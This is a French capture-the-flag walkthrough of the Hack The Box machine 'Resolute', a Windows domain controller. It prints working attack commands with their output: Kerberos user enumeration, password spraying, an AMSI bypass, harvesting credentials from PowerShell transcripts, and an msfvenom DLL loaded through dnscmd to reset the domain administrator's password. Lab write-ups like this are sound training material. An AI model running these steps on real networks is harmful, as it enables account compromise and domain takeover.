| Room                                 | Resolute                                |
| ------------------------------------ | --------------------------------------- |
| Url                                  | https://app.hackthebox.com/machines/220 |
| Sujets                               | Windows/AD/ADCS                         |
| Active/Retired lors de la résolution | Retired                                 |
| Difficulté                           | Medium                                  |

---
### Nmap

```bash
PORT      STATE SERVICE      REASON  VERSION
53/tcp    open  domain       syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2024-03-18 22:51:36Z)
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?    syn-ack
593/tcp   open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack
3268/tcp  open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack
5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       syn-ack .NET Message Framing
47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack Microsoft Windows RPC
49676/tcp open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        syn-ack Microsoft Windows RPC
49686/tcp open  msrpc        syn-ack Microsoft Windows RPC
49706/tcp open  msrpc        syn-ack Microsoft Windows RPC
49750/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Enumération des utilisateurs :

```bash
pak@DESKTOP-AF1CU53:~$ Downloads/kerbrute_linux_amd64 userenum --dc 10.129.167.19 -d megabank.local /usr/share/wordlists/secl
ists/Usernames/xato-net-10-million-usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 03/18/24 - Ronnie Flathers @ropnop

2024/03/18 23:49:16 >  Using KDC(s):
2024/03/18 23:49:16 >   10.129.167.19:88

2024/03/18 23:49:16 >  [+] VALID USERNAME:       steve@megabank.local
2024/03/18 23:49:17 >  [+] VALID USERNAME:       fred@megabank.local
2024/03/18 23:49:17 >  [+] VALID USERNAME:       marcus@megabank.local
2024/03/18 23:49:17 >  [+] VALID USERNAME:       simon@megabank.local
2024/03/18 23:49:17 >  [+] VALID USERNAME:       ryan@megabank.local
2024/03/18 23:49:17 >  [+] VALID USERNAME:       stevie@megabank.local
2024/03/18 23:49:18 >  [+] VALID USERNAME:       angela@megabank.local
2024/03/18 23:49:19 >  [+] VALID USERNAME:       Steve@megabank.local
2024/03/18 23:49:20 >  [+] VALID USERNAME:       claire@megabank.local
2024/03/18 23:49:21 >  [+] VALID USERNAME:       sally@megabank.local
2024/03/18 23:49:22 >  [+] VALID USERNAME:       claude@megabank.local
2024/03/18 23:49:24 >  [+] VALID USERNAME:       melanie@megabank.local
2024/03/18 23:49:25 >  [+] VALID USERNAME:       administrator@megabank.local
2024/03/18 23:49:26 >  [+] VALID USERNAME:       gustavo@megabank.local
2024/03/18 23:49:27 >  [+] VALID USERNAME:       STEVE@megabank.local
2024/03/18 23:49:28 >  [+] VALID USERNAME:       marko@megabank.local
2024/03/18 23:49:29 >  [+] VALID USERNAME:       Marcus@megabank.local
2024/03/18 23:49:33 >  [+] VALID USERNAME:       Angela@megabank.local
2024/03/18 23:49:35 >  [+] VALID USERNAME:       Ryan@megabank.local
2024/03/18 23:49:35 >  [+] VALID USERNAME:       Fred@megabank.local
2024/03/18 23:49:36 >  [+] VALID USERNAME:       paulo@megabank.local
2024/03/18 23:49:38 >  [+] VALID USERNAME:       felicia@megabank.local
2024/03/18 23:49:39 >  [+] VALID USERNAME:       annette@megabank.local
2024/03/18 23:49:39 >  [+] VALID USERNAME:       abigail@megabank.local
2024/03/18 23:49:42 >  [+] VALID USERNAME:       Stevie@megabank.local
2024/03/18 23:49:42 >  [+] VALID USERNAME:       FRED@megabank.local
2024/03/18 23:49:44 >  [+] VALID USERNAME:       Simon@megabank.local
2024/03/18 23:49:53 >  [+] VALID USERNAME:       Annette@megabank.local
2024/03/18 23:50:05 >  [+] VALID USERNAME:       annika@megabank.local
2024/03/18 23:50:06 >  [+] VALID USERNAME:       Claude@megabank.local
2024/03/18 23:50:19 >  [+] VALID USERNAME:       per@megabank.local
2024/03/18 23:50:23 >  [+] VALID USERNAME:       Administrator@megabank.local
2024/03/18 23:50:35 >  [+] VALID USERNAME:       Sally@megabank.local
2024/03/18 23:50:36 >  [+] VALID USERNAME:       MARCUS@megabank.local
2024/03/18 23:50:45 >  [+] VALID USERNAME:       Claire@megabank.local
2024/03/18 23:50:45 >  [+] VALID USERNAME:       ANGELA@megabank.local
2024/03/18 23:50:48 >  [+] VALID USERNAME:       naoki@megabank.local
2024/03/18 23:50:55 >  [+] VALID USERNAME:       Melanie@megabank.local
2024/03/18 23:50:55 >  [+] VALID USERNAME:       Marko@megabank.local
2024/03/18 23:51:07 >  [+] VALID USERNAME:       SIMON@megabank.local
2024/03/18 23:51:09 >  [+] VALID USERNAME:       zach@megabank.local
2024/03/18 23:51:44 >  [+] VALID USERNAME:       Paulo@megabank.local
2024/03/18 23:51:45 >  [+] VALID USERNAME:       CLAUDE@megabank.local
2024/03/18 23:52:11 >  [+] VALID USERNAME:       Felicia@megabank.local
2024/03/18 23:52:15 >  [+] VALID USERNAME:       ulf@megabank.local
2024/03/18 23:52:44 >  [+] VALID USERNAME:       RYAN@megabank.local
2024/03/18 23:53:39 >  [+] VALID USERNAME:       MELANIE@megabank.local
2024/03/18 23:53:40 >  [+] VALID USERNAME:       Gustavo@megabank.local
2024/03/18 23:54:01 >  [+] VALID USERNAME:       resolute@megabank.local
2024/03/18 23:55:08 >  [+] VALID USERNAME:       ANNETTE@megabank.local
2024/03/18 23:57:11 >  [+] VALID USERNAME:       STEVIE@megabank.local
2024/03/18 23:57:13 >  [+] VALID USERNAME:       PAULO@megabank.local
2024/03/18 23:57:15 >  [+] VALID USERNAME:       MARKO@megabank.local
2024/03/18 23:57:18 >  [+] VALID USERNAME:       GUSTAVO@megabank.local
2024/03/18 23:57:21 >  [+] VALID USERNAME:       CLAIRE@megabank.local
2024/03/18 23:57:23 >  [+] VALID USERNAME:       Annika@megabank.local
2024/03/19 00:03:22 >  [+] VALID USERNAME:       Ulf@megabank.local
```

J'ai ensuite tenté de voir si certains des utilisateurs n'étaient pas asreproastables :

```bash
pak@DESKTOP-AF1CU53:~/tmp$ impacket-GetNPUsers -dc-ip 10.129.167.19 -usersfile users.txt megabank.local/
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User steve doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fred doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User marcus doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User simon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ryan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User stevie doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User angela doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User claire doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User claude doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User melanie doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User gustavo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User marko doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User felicia doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User annette doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User per doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sally doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User zach doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paulo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User felicia doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ulf doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ryan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User abigail doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User naoki doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User resolute doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
```

Rien :). Samba ne donne rien non plus. Je tente alors une énumération du LDAP :

```bash
pak@DESKTOP-AF1CU53:~/tmp$ netexec ldap 10.129.167.19 -u "" -p "" -M get-desc-users
SMB         10.129.167.19   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
LDAP        10.129.167.19   389    RESOLUTE         [+] megabank.local\:
GET-DESC... 10.129.167.19   389    RESOLUTE         [+] Found following users:
GET-DESC... 10.129.167.19   389    RESOLUTE         User: Administrator description: Built-in account for administering the computer/domain
GET-DESC... 10.129.167.19   389    RESOLUTE         User: Guest description: Built-in account for guest access to the computer/domain
GET-DESC... 10.129.167.19   389    RESOLUTE         User: DefaultAccount description: A user account managed by the system.
GET-DESC... 10.129.167.19   389    RESOLUTE         User: krbtgt description: Key Distribution Center Service Account
GET-DESC... 10.129.167.19   389    RESOLUTE         User: marko description: Account created. Password set to Welcome123!
```

On a un utilisateur et un pass ! On confirme la connexion :

```bash
pak@DESKTOP-AF1CU53:~/tmp$ netexec smb 10.129.167.19 -u marko -p 'Welcome123!'
SMB         10.129.167.19   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE
```

Et... le pass ne fonctionne pas. Comme il est dit que c'est le password utilisé à la création d'un compte, je tente donc un password-spraying sur ma liste d'utilisateur:

```bash
pak@DESKTOP-AF1CU53:~/tmp$ netexec smb 10.129.167.19 -u users.txt -p 'Welcome123!'
SMB         10.129.167.19   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\simon:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.167.19   445    RESOLUTE         [+] megabank.local\melanie:Welcome123!
```

Et là on a un truc. Et même une connexion via WinRM :

```bash
pak@DESKTOP-AF1CU53:~/tmp$ evil-winrm -i 10.129.167.19 -u melanie -p 'Welcome123!'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\melanie\Documents>
```

L'utilisateur ne semble pas avoir de droits particuliers :

```powershell
*Evil-WinRM* PS C:\Users\melanie\Documents> whoami /all

USER INFORMATION
----------------

User Name        SID
================ ===============================================
megabank\melanie S-1-5-21-1392959593-3013219662-3596683436-10101


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Winpeas n'a rien donné de particulier, on lance alors adpeas qui servira ensuite à alimenter notre bloodhound :

```bash
*Evil-WinRM* PS C:\Users\melanie\Documents> Bypass-4MSI

Info: Patching 4MSI, please be patient...

[+] Success!
*Evil-WinRM* PS C:\Users\melanie\Documents> dir


    Directory: C:\Users\melanie\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/18/2024   4:34 PM        3119779 adPEAS.ps1
-a----        3/18/2024   4:27 PM        2234368 winPEASx64_ofs.exe


*Evil-WinRM* PS C:\Users\melanie\Documents> Import-Module .\adPEAS.ps1
*Evil-WinRM* PS C:\Users\melanie\Documents> Invoke-adpeas
```

Bloodhound ne donne rien de particulier... Je chercher alors quelques trucs à la main.

```powershell
*Evil-WinRM* PS C:\> dir -force

    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        3/18/2024   4:29 PM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-        3/18/2024   3:48 PM      402653184 pagefile.sys


*Evil-WinRM* PS C:\> cd PSTranscripts
*Evil-WinRM* PS C:\PSTranscripts> dir
*Evil-WinRM* PS C:\PSTranscripts> dir -force


    Directory: C:\PSTranscripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--        12/3/2019   6:45 AM                20191203


*Evil-WinRM* PS C:\PSTranscripts> cd 20191203
*Evil-WinRM* PS C:\PSTranscripts\20191203> dir -force


    Directory: C:\PSTranscripts\20191203


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```

à l'intérieur de ce .txt :

```powershell
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
```

Le pass fonctionne :

```bash
pak@DESKTOP-AF1CU53:~$ netexec smb 10.129.167.19 -u ryan -p 'Serv3r4Admin4cc123!'
SMB         10.129.167.19   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.167.19   445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)
```

![Pasted image 20240319004718](../../../Files/Pasted%20image%2020240319004718.png)

L'utilisateur fait parti du groupe "dnsadmins" : il peut s'agir d'un vecteur de privesc vers l'utilisateur admin.

```bash
pak@DESKTOP-AF1CU53:~$ msfvenom -p windows/x64/exec cmd='net user administrator pakpak123! /domain' -f dll -o adduser.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 309 bytes
Final size of dll file: 9216 bytes
Saved as: adduser.dll
```

```powershell
*Evil-WinRM* PS C:\Users\ryan\Documents> upload /home/pak/adduser.dll

Info: Uploading /home/pak/adduser.dll to C:\Users\ryan\Documents\adduser.dll

Data: 12288 bytes of 12288 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\ryan\Documents> dir


    Directory: C:\Users\ryan\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/18/2024   5:01 PM              0 adduser.dll
-a----        3/18/2024   4:58 PM              5 start
-a----        3/18/2024   4:58 PM              5 stop


*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd.exe /config /serverlevelplugindll C:\Users\ryan\Documents\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

*Evil-WinRM* PS C:\Users\ryan\Documents> cmd.exe /c 'sc stop dns'

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\ryan\Documents> cmd.exe /c 'sc start dns'

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 1496
        FLAGS              :
*Evil-WinRM* PS C:\Users\ryan\Documents>
```

Et on est root :) !